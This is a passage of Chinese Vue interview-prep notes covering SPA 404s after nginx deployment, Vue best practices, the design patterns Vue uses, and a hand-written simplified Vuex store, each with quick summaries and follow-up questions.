<code>Nginx</code> 单独代理 <code>/api</code>，并传递 <code>Host</code>、<code>X-Real-IP</code> 与 <code>X-Forwarded-For</code>；代理会增加网关配置和运维责任。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_55-vue项目本地开发完成后部署到服务器后报404是什么原因呢\\"><a class=\\"header-anchor\\" href=\\"#_55-vue项目本地开发完成后部署到服务器后报404是什么原因呢\\">#</a> 55 Vue项目本地开发完成后部署到服务器后报404是什么原因呢</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>最常见：<code>history</code> 模式下服务器没配回退 —— 前端路由的路径在服务器上没有真实文件，要配 <code>try_files $uri $uri/ /index.html</code></li>\\n<li>第二常见：<strong>静态资源路径不对</strong> —— 部署在子目录时要设 <code>publicPath</code>/<code>base</code>，否则资源请求打到根路径</li>\\n<li>第三种：接口 404，通常是生产环境的 <code>baseURL</code> 没改、或者 <code>Nginx</code> 没配接口转发（<code>devServer.proxy</code> 带不到线上）</li>\\n<li>排查顺序：先看 <code>Network</code> 里 404 的是<strong>页面</strong>、<strong>静态资源</strong>还是<strong>接口</strong>，三者原因完全不同</li>\\n<li><code>hash</code> 模式不会有页面 404 的问题（<code>#</code> 后面不发给服务器），但 <code>URL</code> 难看且不利 <code>SEO</code></li>\\n</ul>\\n<p><strong>部署后出现 <code>404</code>，通常是前端路由、静态资源路径或接口代理与生产环境不匹配。</strong> <code>history</code> 模式的路由在服务器上没有对应文件，需要用 <code>try_files $uri $uri/ /index.html</code> 回退到首页。部署到子目录时还要配置 <code>publicPath</code> 或 <code>base</code>，否则资源会错误地请求根路径。排查时我一般先看 <code>Network</code> 中报错的是页面、资源还是接口；接口报错还要检查生产环境 <code>baseURL</code> 和 <code>Nginx</code> 转发，因为 <code>devServer.proxy</code> 不会带到线上。</p>\\n</section>\\n<h3 id=\\"如何部署\\"><a class=\\"header-anchor\\" href=\\"#如何部署\\">#</a> 如何部署</h3>\\n<p>前后端分离开发模式下，前后端是独立布署的，前端只需要将最后的构建物上传至目标服务器的<code>web</code>容器指定的静态目录下即可</p>\\n<p>我们知道<code>vue</code>项目在构建后，是生成一系列的静态文件</p>\\n<p>常规布署我们只需要将这个目录上传至目标服务器即可</p>\\n<pre class=\\"language-bash\\"><code># scp 上传 user为主机登录用户，host为主机外网ip, xx为web容器静态资源路径\\nscp dist.zip user@host:/xx/xx/xx\\n</code></pre>\\n<p>让<code>web</code>容器跑起来，以<code>nginx</code>为例</p>\\n<pre class=\\"language-nginx\\"><code>server {\\n  listen  80;\\n  server_name  www.xxx.com;\\n\\n  location / {\\n    index  /data/dist/index.html;\\n  }\\n}\\n</code></pre>\\n<p>配置完成记得重启<code>nginx</code></p>\\n<pre class=\\"language-js\\"><code>// 检查配置是否正确\\nnginx -t \\n\\n// 平滑重启\\nnginx -s reload\\n</code></pre>\\n<p>操作完后就可以在浏览器输入域名进行访问了</p>\\n<p>当然上面只是提到最简单也是最直接的一种布署方式</p>\\n<p>什么自动化，镜像，容器，流水线布署，本质也是将这套逻辑抽象，隔离，用程序来代替重复性的劳动，本文不展开</p>\\n<h3 id=\\"_404问题\\"><a class=\\"header-anchor\\" href=\\"#_404问题\\">#</a> 404问题</h3>\\n<p>这是一个经典的问题，相信很多同学都有遇到过，那么你知道其真正的原因吗？</p>\\n<p>我们先还原一下场景：</p>\\n<ul>\\n<li><code>vue</code>项目在本地时运行正常，但部署到服务器中，刷新页面，出现了404错误</li>\\n</ul>\\n<p>先定位一下，HTTP 404 错误意味着链接指向的资源不存在</p>\\n<p>问题在于为什么不存在？且为什么只有<code>history</code>模式下会出现这个问题？</p>\\n<p><strong>为什么history模式下有问题</strong></p>\\n<p><code>Vue</code>是属于单页应用（single-page application）</p>\\n<p>而<code>SPA</code>是一种网络应用程序或网站的模型，所有用户交互是通过动态重写当前页面，前面我们也看到了，不管我们应用有多少页面，构建物都只会产出一个<code>index.html</code></p>\\n<p>现在，我们回头来看一下我们的<code>nginx</code>配置</p>\\n<pre class=\\"language-js\\"><code>server {\\n  listen  80;\\n  server_name  www.xxx.com;\\n\\n  location / {\\n    index  /data/dist/index.html;\\n  }\\n}\\n</code></pre>\\n<p>可以根据 <code>nginx</code> 配置得出，当我们在地址栏输入 <code>www.xxx.com</code> 时，这时会打开我们 <code>dist</code> 目录下的 <code>index.html</code> 文件，然后我们在跳转路由进入到 <code>www.xxx.com/login</code></p>\\n<p>关键在这里，当我们在 <code>website.com/login</code> 页执行刷新操作，<code>nginx location</code> 是没有相关配置的，所以就会出现 <code>404</code> 的情况</p>\\n<p><strong>为什么hash模式下没有问题</strong></p>\\n<p><code>router hash</code> 模式我们都知道是用符号#表示的，如 <code>website.com/#/login</code>, <code>hash</code> 的值为 <code>#/login</code></p>\\n<p>它的特点在于：<code>hash</code> 虽然出现在 <code>URL</code> 中，但不会被包括在 <code>HTTP</code> 请求中，对服务端完全没有影响，因此改变 <code>hash</code> 不会重新加载页面</p>\\n<p><code>hash</code> 模式下，仅 <code>hash</code> 符号之前的内容会被包含在请求中，如 <code>website.com/#/login</code> 只有 <code>website.com</code> 会被包含在请求中 ，因此对于服务端来说，即使没有配置<code>location</code>，也不会返回<code>404</code>错误</p>\\n<h3 id=\\"解决方案\\"><a class=\\"header-anchor\\" href=\\"#解决方案\\">#</a> 解决方案</h3>\\n<p>看到这里我相信大部分同学都能想到怎么解决问题了，</p>\\n<p>产生问题的本质是因为我们的路由是通过JS来执行视图切换的，</p>\\n<p>当我们进入到子路由时刷新页面，<code>web</code>容器没有相对应的页面此时会出现<code>404</code></p>\\n<p>所以我们只需要配置将任意页面都重定向到 <code>index.html</code>，把路由交由前端处理</p>\\n<p>对<code>nginx</code>配置文件<code>.conf</code>修改，添加<code>try_files $uri $uri/ /index.html;</code></p>\\n<pre class=\\"language-nginx\\"><code>server {\\n  listen  80;\\n  server_name  www.xxx.com;\\n\\n  location / {\\n    index  /data/dist/index.html;\\n    try_files $uri $uri/ /index.html;\\n  }\\n}\\n</code></pre>\\n<p>修改完配置文件后记得配置的更新</p>\\n<pre class=\\"language-bash\\"><code>nginx -s reload\\n</code></pre>\\n<p>这么做以后，你的服务器就不再返回 404 错误页面，因为对于所有路径都会返回 <code>index.html</code> 文件</p>\\n<p>为了避免这种情况，你应该在 <code>Vue</code> 应用里面覆盖所有的路由情况，然后在给出一个 404 页面</p>\\n<pre class=\\"language-js\\"><code>const router = new VueRouter({\\n  mode: &#39;history&#39;,\\n  routes: [\\n    { path: &#39;*&#39;, component: NotFoundComponent }\\n  ]\\n})\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>单页应用首页 <code>/</code> 能打开，但用户把 <code>/orders/42</code> 收藏后直接访问就收到服务器 <code>404</code>，为什么前端已经声明该路由仍无效？</strong></p>\\n<p>直接访问时请求先到 <code>Web</code> 容器，服务器会按真实文件路径查找 <code>/orders/42</code>，此时前端路由代码尚未执行。<code>history</code> 路由只在应用加载后接管视图切换，因此服务器必须把未命中的页面路径回退到 <code>index.html</code>。</p>\\n</li>\\n<li>\\n<p><strong>准备把 <code>Vue Router</code> 的 <code>history</code> 模式部署到 <code>Nginx</code>，同时还要保留已有静态文件访问，你会在 <code>location /</code> 中怎样落地？</strong></p>\\n<p>可配置 <code>try_files $uri $uri/ /index.html;</code>，让真实文件和目录优先命中，剩余路径才返回应用入口。修改配置后需要执行 <code>nginx -s reload</code> 使其生效；若入口位置或站点根目录配置错误，回退仍可能返回错误文件。</p>\\n</li>\\n<li>\\n<p><strong>运维提出把所有请求都无条件重定向到 <code>index.html</code>，但站点还包含图片和脚本资源，这种配置会带来什么现象？</strong></p>\\n<p>资源路径写错时也可能返回 <code>index.html</code>，浏览器拿到的内容类型和实际脚本、图片不符，故障会从清晰的 <code>404</code> 变成更难识别的加载错误。应保留 <code>$uri</code> 和 <code>$uri/</code> 的真实资源匹配，仅对未命中的前端页面路径回退。</p>\\n</li>\\n<li>\\n<p><strong>已经加入 <code>try_files $uri $uri/ /index.html;</code> 并重载 <code>Nginx</code>，刷新子路由不再显示服务器 <code>404</code>，却只出现空白页，你下一步查什么？</strong></p>\\n<p>先确认返回的确是当前构建产物的 <code>index.html</code>，再检查浏览器控制台中的脚本、样式加载错误以及前端路由是否覆盖该地址。服务端回退只保证应用能够启动，不能替代前端路由匹配；未声明的路径应由通配路由渲染 <code>NotFoundComponent</code>。</p>\\n</li>\\n<li>\\n<p><strong>团队想彻底避免刷新 <code>404</code>，有人主张改用带 <code>#</code> 的路由，有人坚持 <code>history</code> 加服务器回退，你如何取舍？</strong></p>\\n<p>若无法修改 <code>Web</code> 容器配置，使用哈希路由可避免服务器把片段部分当作文件路径处理。若能控制 <code>Nginx</code>，<code>history</code> 配合 <code>try_files</code> 可保留普通路径，但必须同步维护入口回退和前端通配 <code>404</code>；两者差异主要在部署约束与 <code>URL</code> 形式。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_56-实际工作中-你总结的vue最佳实践有哪些\\"><a class=\\"header-anchor\\" href=\\"#_56-实际工作中-你总结的vue最佳实践有哪些\\">#</a> 56 实际工作中，你总结的vue最佳实践有哪些</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>组件：<code>props</code> 声明类型和默认值、单向数据流不改 <code>props</code>、<code>props</code> 超过十几个就该换插槽</li>\\n<li>性能：长列表上虚拟滚动、<code>v-if</code>/<code>v-show</code> 按切换频率选、<code>computed</code> 缓存重计算、避免大对象进 <code>data</code></li>\\n<li>可维护：取值收敛到 <code>getters</code>/<code>computed</code> 不裸写深层路径、业务逻辑抽成组合式函数、目录按业务模块划分</li>\\n<li>健壮性：组件销毁必须清理定时器/监听/连接、请求要有超时和错误兜底、全局捕获 <code>errorHandler</code> 和 <code>unhandledrejection</code></li>\\n<li>工程：规范工具链初期就装、环境变量分层、<code>key</code> 用稳定业务 id、<code>v-if</code> 和 <code>v-for</code> 不写在同一元素上</li>\\n</ul>\\n<p><strong>我认为 <code>Vue</code> 的最佳实践，本质上是让组件更清晰、渲染开销更可控，同时守住输入安全。</strong> 编码上使用多词组件名，<code>props</code> 写清类型等细节，<code>v-for</code> 必须提供稳定的 <code>key</code>，并避免和 <code>v-if</code> 放在同一元素上。性能上优先采用路由懒加载，长列表再考虑虚拟滚动，深层大数组可用 <code>shallowRef</code> 或 <code>shallowReactive</code> 降低响应式开销。安全边界是不要拼接不可信模板，并谨慎使用 <code>v-html</code>、动态 <code>URL</code> 和样式，避免注入风险。</p>\\n</section>\\n<p>从编码风格、性能、安全等方面说几条：</p>\\n<p><strong>编码风格方面：</strong></p>\\n<ul>\\n<li>命名组件时使用“多词”风格避免和<code>HTML</code>元素冲突</li>\\n<li>使用“细节化”方式定义属性而不是只有一个属性名</li>\\n<li>属性名声明时使用“驼峰命名”，模板或<code>jsx</code>中使用“肉串命名”</li>\\n<li>使用<code>v-for</code>时务必加上<code>key</code>，且不要跟<code>v-if</code>写在一起</li>\\n</ul>\\n<p><strong>性能方面：</strong></p>\\n<ul>\\n<li>路由懒加载减少应用尺寸</li>\\n<li>利用<code>SSR</code>减少首屏加载时间</li>\\n<li>利用<code>v-once</code>渲染那些不需要更新的内容</li>\\n<li>一些长列表可以利用虚拟滚动技术避免内存过度占用</li>\\n<li>对于深层嵌套对象的大数组可以使用<code>shallowRef</code>或<code>shallowReactive</code>降低开销</li>\\n<li>避免不必要的组件抽象</li>\\n</ul>\\n<p><strong>安全：</strong></p>\\n<ul>\\n<li>不使用不可信模板，例如使用用户输入拼接模板：<code>template: &lt;div&gt; + userProvidedString + &lt;/div&gt;</code></li>\\n<li>避免使用<code>v-html</code>，<code>:url</code>，<code>:style</code>等，避免<code>html</code>、<code>url</code>、样式等注入</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>列表模板把 <code>v-for</code> 和 <code>v-if</code> 写在同一个节点上，并用数组下标作为 <code>key</code>；筛选后输入框内容串到了别的行，你会改哪两处？</strong></p>\\n<p>应先在计算结果中完成筛选，模板只对过滤后的数据执行 <code>v-for</code>，避免循环与条件职责混杂。<code>key</code> 应使用稳定且唯一的业务标识，而不是会随插入、删除变化的下标；若数据本身没有稳定标识，需要先补齐数据契约。</p>\\n</li>\\n<li>\\n<p><strong>一个管理后台首包包含几十个低频页面，用户只访问其中少数模块，你会优先采用哪些有明确边界的优化？</strong></p>\\n<p>应先对业务路由使用动态导入实现懒加载，避免初始阶段下载全部页面代码；完全静态且后续无需更新的片段可谨慎使用 <code>v-once</code>。<code>SSR</code> 也能改善首屏呈现，但会引入服务端渲染和部署复杂度，不应在未评估收益时直接采用。</p>\\n</li>\\n<li>\\n<p><strong>数据看板要展示很长的记录列表，并保存深层嵌套的大数组；团队坚持所有层级都做深度响应式，你会怎样调整？</strong></p>\\n<p>长列表应采用虚拟滚动，只渲染视口附近内容，避免同时创建大量 <code>DOM</code>。若大数组主要整体替换、内部深层字段不依赖细粒度更新，可使用 <code>shallowRef</code> 或 <code>shallowReactive</code> 降低响应式开销；需要深层联动时不能盲目改浅。</p>\\n</li>\\n<li>\\n<p><strong>某页面切换筛选条件后仍不更新，代码为了提速给结果区加了 <code>v-once</code>，你会如何定位并修复？</strong></p>\\n<p>先确认该区域是否依赖会变化的筛选状态；若依赖，<code>v-once</code> 会让首次渲染后的内容不再更新，应移除它并恢复正常响应式渲染。<code>v-once</code> 只适用于生命周期内确定不变的内容，把动态区域标成静态会以正确性换取无效优化。</p>\\n</li>\\n<li>\\n<p><strong>代码评审中有人为了“复用”把只有一处使用的两行模板拆成多层组件，另一人要求全部保留在页面内，你会怎样定边界？</strong></p>\\n<p>应看抽象是否形成稳定职责、复用价值或隔离复杂状态，而不是以代码行数决定。没有独立语义的多层包装会增加组件通信和理解成本，但复杂页面完全不拆也会降低维护性；最佳实践是避免不必要抽象，而非禁止抽象。</p>\\n</li>\\n<li>\\n<p><strong>评论页准备把用户输入拼进运行时 <code>template</code>，富文本区则直接使用 <code>v-html</code>，安全评审为什么会阻止这两种实现？</strong></p>\\n<p>不可信内容进入模板或 <code>v-html</code> 会形成注入风险，用户数据不应被当作可执行模板或未经处理的 <code>HTML</code>。类似地，动态 <code>url</code> 和 <code>style</code> 也需限制允许值并经过可信处理；确需富文本时应建立严格清洗规则，不能把前端渲染当作安全校验。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_57-vue-中使用了哪些设计模式\\"><a class=\\"header-anchor\\" href=\\"#_57-vue-中使用了哪些设计模式\\">#</a> 57 vue 中使用了哪些设计模式</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><strong>观察者模式</strong>：响应式系统的 <code>Dep</code> + <code>Watcher</code>，双方<strong>直接互相持有</strong></li>\\n<li><strong>发布订阅模式</strong>：<code>$on</code>/<code>$emit</code> 事件中心，发布者和订阅者<strong>互不认识</strong>，靠中间人调度 —— 这是两者的判断依据</li>\\n<li><strong>代理模式</strong>：<code>Vue 3</code> 的 <code>Proxy</code> 响应式，以及 <code>this.xxx</code> 访问 <code>data</code> 的那层代理</li>\\n<li><strong>工厂模式</strong>：<code>createElement</code> 按参数返回标签 <code>VNode</code> 或组件 <code>VNode</code></li>\\n<li><strong>策略模式</strong>：选项合并（<code>data</code> 递归合并、生命周期合并成数组、<code>methods</code> 组件覆盖）——加一种选项只需加一个策略函数</li>\\n<li><strong>单例模式</strong>：<code>Vue.use</code> 和插件 <code>install</code> 里的重复安装检查；<strong>装饰器模式</strong>：数组七个方法的重写</li>\\n</ul>\\n<p><strong><code>Vue</code> 中比较典型的是观察者、发布订阅、代理和策略模式，它们分别服务于响应式、事件通信和选项处理。</strong> 响应式系统里，<code>Dep</code> 收集并直接通知 <code>Watcher</code>，属于观察者模式；<code>$on</code> 与 <code>$emit</code> 通过事件中心解耦双方，更接近发布订阅。<code>Vue 3</code> 用 <code>Proxy</code> 拦截数据访问，而 <code>mergeOptions</code> 会让 <code>data</code>、生命周期和 <code>methods</code> 采用不同合并策略。两种通信模式的边界很好判断：双方直接感知彼此是观察者，经由中心调度则是发布订阅。</p>\\n</section>\\n<p>回答这题的关键不是背模式名，而是能说出**<code>Vue</code> 在哪一处用了它、解决了什么问题**。</p>\\n<table>\\n<thead>\\n<tr>\\n<th>模式</th>\\n<th><code>Vue</code> 里的体现</th>\\n<th>解决什么</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><strong>观察者模式</strong></td>\\n<td>响应式系统：<code>Dep</code>（被观察者）持有 <code>Watcher</code>（观察者）列表，数据变了直接 <code>notify</code></td>\\n<td>数据和视图的自动同步</td>\\n</tr>\\n<tr>\\n<td><strong>发布订阅模式</strong></td>\\n<td>组件的 <code>$on</code>/<code>$emit</code> 事件中心</td>\\n<td>发布者和订阅者互不认识，靠中间人调度</td>\\n</tr>\\n<tr>\\n<td><strong>代理模式</strong></td>\\n<td><code>Vue 3</code> 的 <code>Proxy</code> 响应式；<code>this.xxx</code> 访问 <code>data</code> 也是一层代理</td>\\n<td>在不改变接口的前提下拦截访问</td>\\n</tr>\\n<tr>\\n<td><strong>工厂模式</strong></td>\\n<td><code>createElement</code>（<code>_c</code>）根据参数返回普通标签 <code>VNode</code> 或组件 <code>VNode</code></td>\\n<td>把&quot;创建什么&quot;的判断收在一处</td>\\n</tr>\\n<tr>\\n<td><strong>单例模式</strong></td>\\n<td><code>Vue.use</code> 内部记录已安装插件、<code>Vuex</code>/<code>Router</code> 的 <code>install</code> 里判断已存在就直接返回</td>\\n<td>避免重复安装</td>\\n</tr>\\n<tr>\\n<td><strong>策略模式</strong></td>\\n<td>选项合并策略（<code>mergeOptions</code>）：<code>data</code>、生命周期、<code>methods</code> 各有一套合并函数</td>\\n<td>同一件事的多种算法可替换</td>\\n</tr>\\n<tr>\\n<td><strong>装饰器模式</strong></td>\\n<td>数组方法重写（先调原生方法，再补上通知）</td>\\n<td>不改原实现的前提下增强功能</td>\\n</tr>\\n<tr>\\n<td><strong>适配器模式</strong></td>\\n<td>跨平台渲染：同一套 <code>VNode</code> 交给不同渲染器（<code>DOM</code>/原生/小程序）</td>\\n<td>屏蔽平台差异</td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>其中最值得展开的是观察者和发布订阅的区别</strong> —— 面试官很爱追问：</p>\\n<ul>\\n<li><strong>观察者模式</strong>：<code>Dep</code> 和 <code>Watcher</code> <strong>直接互相持有</strong>，数据变了 <code>Dep</code> 点名通知自己收集到的那些 <code>Watcher</code>。中间没有第三方。</li>\\n<li><strong>发布订阅模式</strong>：靠一个<strong>中心调度</strong>（事件总线），发布者只管往中心扔事件，订阅者只管从中心听，两者互相不认识。</li>\\n</ul>\\n<p><code>Vue</code> 的响应式是前者，<code>$emit</code>/<code>$on</code> 是后者。判断依据就一条：<strong>双方知不知道对方的存在</strong>。</p>\\n<p><strong>策略模式在选项合并里的体现</strong>很值得说 —— 它解释了为什么 <code>mixin</code> 的 <code>data</code> 是递归合并而生命周期钩子是合并成数组：</p>\\n<pre class=\\"language-js\\"><code>strats.data = mergeDataFn         // 递归合并，组件优先\\nstrats.created = mergeHook        // 合并成数组，依次调用\\nstrats.methods = mergeObject      // 同名时组件覆盖 mixin\\n</code></pre>\\n<p>不同选项走不同策略函数，加一种选项只要加一个策略，不用改主流程。</p>\\n<p>下面是各模式的具体说明：</p>\\n<ul>\\n<li><strong>工厂模式</strong> 传入参数即可创建实例：虚拟 <code>DOM</code> 根据参数的不同返回基础标签的 <code>Vnode</code> 和组件 <code>Vnode</code></li>\\n<li><strong>单例模式</strong> 整个程序有且仅有一个实例：<code>vuex</code> 和 <code>vue-router</code> 的插件注册方法 <code>install</code> 判断如果系统存在实例就直接返回掉</li>\\n<li><strong>发布-订阅模式 (vue 事件机制)</strong></li>\\n<li><strong>观察者模式 (响应式数据原理)</strong></li>\\n<li><strong>装饰模式: (@装饰器的用法)</strong></li>\\n<li><strong>策略模式</strong> 策略模式指对象有某个行为,但是在不同的场景中,该行为有不同的实现方案-比如选项的合并策略</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>同事把响应式依赖收集和组件事件总线都称为“发布订阅”，但调试时发现 <code>Dep</code> 内部直接保存一组 <code>Watcher</code>，你会如何纠正？</strong></p>\\n<p>这里更符合观察者模式：<code>Dep</code> 持有收集到的 <code>Watcher</code>，数据变化后直接逐一通知。事件总线的 <code>$on</code>、<code>$emit</code> 才体现发布订阅，发布者与订阅者通过中心调度而互不认识；判断关键是双方是否直接建立依赖关系。</p>\\n</li>\\n<li>\\n<p><strong>维护虚拟 <code>DOM</code> 创建逻辑时，普通标签和组件节点分散在多个调用方判断，导致新增节点类型要到处修改，你会用哪种模式收口？</strong></p>\\n<p>可用工厂模式把创建判断集中到 <code>createElement</code> 一类入口，根据参数返回普通标签 <code>VNode</code> 或组件 <code>VNode</code>。调用方只描述要创建的节点，不负责了解构造细节；若把平台渲染差异也塞进同一工厂，职责仍可能继续膨胀。</p>\\n</li>\\n<li>\\n<p><strong>业务组件同时混入两个 <code>mixin</code>，发现 <code>created</code> 都执行了，而同名 <code>methods</code> 最终由组件覆盖；这不是随机行为，你如何解释？</strong></p>\\n<p>这是选项合并的策略模式：生命周期钩子合并为数组依次调用，<code>methods</code> 按对象规则合并并由组件处理同名项，<code>data</code> 则走自己的递归合并策略。不同选项由独立策略函数负责，因此扩展规则不必改动整个合并主流程。</p>\\n</li>\\n<li>\\n<p><strong>插件初始化日志出现两次，但代码确认对同一个插件连续调用了两次 <code>Vue.use</code>；你会从哪个机制排查，又有什么边界？</strong></p>\\n<p>应检查插件对象是否真的是同一个引用，以及安装逻辑是否绕过了 <code>Vue.use</code>，因为框架会记录已安装插件并避免重复安装，体现单例式保护。它只能防止同一安装入口的重复注册，插件内部自行创建资源或传入不同插件对象时仍需自己控制副作用。</p>\\n</li>\\n<li>\\n<p><strong>为兼容 <code>Web</code>、原生容器和小程序，团队希望上层组件继续产出同一种 <code>VNode</code>，各平台只替换渲染实现，这体现什么设计取舍？</strong></p>\\n<p>这体现适配器模式：上层保持统一的 <code>VNode</code> 表达，不同渲染器负责转换为各平台实际节点，从而屏蔽平台差异。收益是组件层不必散落平台判断，代价是适配层必须明确处理各平台能力不一致和无法等价映射的部分。</p>\\n</li>\\n<li>\\n<p><strong>有人把数组响应式中的方法重写简单归为“代理”，但实现是先调用原生方法，再补充依赖通知，你认为更贴近哪种模式？</strong></p>\\n<p>这种结构更贴近装饰器模式，因为它保留原生数组方法的核心行为，并在调用前后附加响应式通知能力。代理模式更强调通过另一层入口拦截访问且保持接口不变，例如 <code>Vue 3</code> 使用 <code>Proxy</code> 拦截对象操作；两者可能形态相近，应按解决的问题区分。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_58-如果让你从零开始写一个vuex-说说你的思路\\"><a class=\\"header-anchor\\" href=\\"#_58-如果让你从零开始写一个vuex-说说你的思路\\">#</a> 58 如果让你从零开始写一个vuex，说说你的思路</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>核心就三件事：<strong>一个响应式的 <code>state</code></strong>、<strong>受控的修改入口</strong>、<strong>注入到每个组件</strong></li>\\n<li><code>state</code> 用 <code>Vue.observable</code>（<code>Vue 2</code>）或 <code>reactive</code>（<code>Vue 3</code>）造响应式；<code>getters</code> 用 <code>computed</code> 实现缓存</li>\\n<li>修改入口：<code>commit(type, payload)</code> 查表调对应的 <code>mutation</code>；<code>dispatch</code> 调 <code>action</code> 并把 <code>commit</code> 传给它</li>\\n<li>注入：<code>Vue 2</code> 用全局 <code>mixin</code> 在 <code>beforeCreate</code> 里把 <code>$store</code> 挂到每个实例；<code>Vue 3</code> 用 <code>app.provide</code></li>\\n<li>进阶：<code>modules</code> 递归注册 + 命名空间、<code>subscribe</code> 支持插件（持久化、<code>devtools</code>）、<code>strict</code> 模式检测非法修改</li>\\n</ul>\\n<p><strong>从零实现一个简化版 <code>Vuex</code>，核心是响应式 <code>state</code>、受控的修改入口，以及把同一个 <code>Store</code> 注入所有组件。</strong> <code>state</code> 可用 <code>Vue.observable</code> 或 <code>reactive</code> 处理，<code>getters</code> 用 <code>computed</code> 提供派生状态和缓存。<code>commit(type, payload)</code> 查找并执行对应 <code>mutation</code>，<code>dispatch</code> 调用可能异步的 <code>action</code>，向它提供 <code>commit</code> 并返回异步结果。组件接入时，<code>Vue 2</code> 可通过全局 <code>mixin</code> 挂载 <code>$store</code>，<code>Vue 3</code> 可使用 <code>app.provide</code>；更完整的实现再补模块、命名空间、订阅插件和严格模式。</p>\\n</section>\\n<p><strong>思路分析</strong></p>\\n<p>这个题目很有难度，首先思考<code>vuex</code>解决的问题：存储用户全局状态并提供管理状态API。</p>\\n<ul>\\n<li><code>vuex</code>需求分析</li>\\n<li>如何实现这些需求</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>官方说<code>vuex</code>是一个状态管理模式和库，并确保这些状态以可预期的方式变更。可见要实现一个<code>vuex</code></li>\\n</ol>\\n<ul>\\n<li>要实现一个<code>Store</code>存储全局状态</li>\\n<li>要提供修改状态所需API：<code>commit(type, payload), dispatch(type, payload)</code></li>\\n</ul>\\n<ol start=\\"2\\">\\n<li>实现<code>Store</code>时，可以定义<code>Store</code>类，构造函数接收选项<code>options</code>，设置属性<code>state</code>对外暴露状态，提供<code>commit</code>和<code>dispatch</code>修改属性<code>state</code>。这里需要设置<code>state</code>为响应式对象，同时将<code>Store</code>定义为一个<code>Vue</code>插件</li>\\n<li><code>commit(type, payload)</code>方法中可以获取用户传入<code>mutations</code>并执行它，这样可以按用户提供的方法修改状态。 <code>dispatch(type, payload)</code>类似，但需要注意它可能是异步的，需要返回一个<code>Promise</code>给用户以处理异步结果</li>\\n</ol>\\n<p><strong>实践</strong></p>\\n<p><code>Store</code>的实现：</p>\\n<pre class=\\"language-js\\"><code>class Store {\\n    constructor(options) {\\n        this.state = reactive(options.state)\\n        this.options = options\\n    }\\n    commit(type, payload) {\\n        this.options.mutations[type].call(this, this.state, payload)\\n    }\\n}\\n</code></pre>\\n<p><strong>vuex简易版</strong></p>\\n<pre class=\\"language-js\\"><code>/**\\n * 1 实现插件，挂载$store\\n * 2 实现store\\n */\\n\\nlet Vue;\\n\\nclass Store {\\n  constructor(options) {\\n    // state响应式处理\\n    // 外部访问： this.$store.state.***\\n    // 第一种写法\\n    // this.state = new Vue({\\n    //   data: options.state\\n    // })\\n\\n    // 第二种写法：防止外界直接接触内部vue实例，防止外部强行变更\\n    this._vm = new Vue({\\n      data: {\\n        $$state: options.state\\n      }\\n    })\\n\\n    this._mutations = options.mutations\\n    this._actions = options.actions\\n    this.getters = {}\\n    options.getters &amp;&amp; this.handleGetters(options.getters)\\n\\n    this.commit = this.commit.bind(this)\\n    this.dispatch = this.dispatch.bind(this)\\n  }\\n\\n  get state () {\\n    return this._vm._data.$$state\\n  }\\n\\n  set state (val) {\\n    return new Error(&#39;Please use replaceState to reset state&#39;)\\n  }\\n\\n  handleGetters (getters) {\\n    Object.keys(getters).map(key =&gt; {\\n      Object.defineProperty(this.getters, key, {\\n        get: () =&gt; getters[key](this.state)\\n      })\\n    })\\n  }\\n\\n  commit (type, payload) {\\n    let entry = this._mutations[type]\\n    if (!entry) {\\n      return new Error(`${type} is not defined`)\\n    }\\n\\n    entry(this.state, payload)\\n  }\\n\\n  dispatch (type, payload) {\\n    let entry = this._actions[type]\\n    if (!entry) {\\n      return new Error(`${type} is not defined`)\\n    }\\n\\n    entry(this, payload)\\n  }\\n}\\n\\nconst install = (_Vue) =&gt; {\\n  Vue = _Vue\\n\\n  Vue.mixin({\\n    beforeCreate () {\\n      if (this.$options.store) {\\n        Vue.prototype.$store = this.$options.store\\n      }\\n    },\\n  })\\n}\\n\\n\\nexport default { Store, install }\\n</code></pre>\\n<p>验证方式</p>\\n<pre class=\\"language-js\\"><code>import Vue from &#39;vue&#39;\\nimport Vuex from &#39;./vuex&#39;\\n// this.$store\\nVue.use(Vuex)\\n\\nexport default new Vuex.Store({\\n  state: {\\n    counter: 0\\n  },\\n  mutations: {\\n    // state从哪里来的\\n    add (state) {\\n      state.counter++\\n    }\\n  },\\n  getters: {\\n    doubleCounter (state) {\\n      return state.counter * 2\\n    }\\n  },\\n  actions: {\\n    add ({ commit }) {\\n      setTimeout(() =&gt; {\\n        commit(&#39;add&#39;)\\n      }, 1000)\\n    }\\n  },\\n  modules: {\\n  }\\n})\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品列表页直接把一个 <code>reactive</code> 对象导出，组件也能共享和修改状态，为什么还要手写 <code>Store</code>、<code>commit</code> 和 <code>dispatch</code>？</strong></p>\\n<p>共享响应式对象只能解决“状态能更新”，不能保证状态以可追踪、可约束的方式变更。<code>Store</code> 应集中保存 <code>state</code>，让同步修改进入 <code>commit</code>、异步流程进入 <code>dispatch</code>；如果允许组件任意写状态，调用来源和变更语义都会变得模糊。</p>\\n</li>\\n<li>\\n<p><strong>后台管理页要接入你的简版状态库，你会怎样让任意层级组件通过 <code>this.$store</code> 访问同一个实例？</strong></p>\\n<p>把状态库实现为 <code>Vue</code> 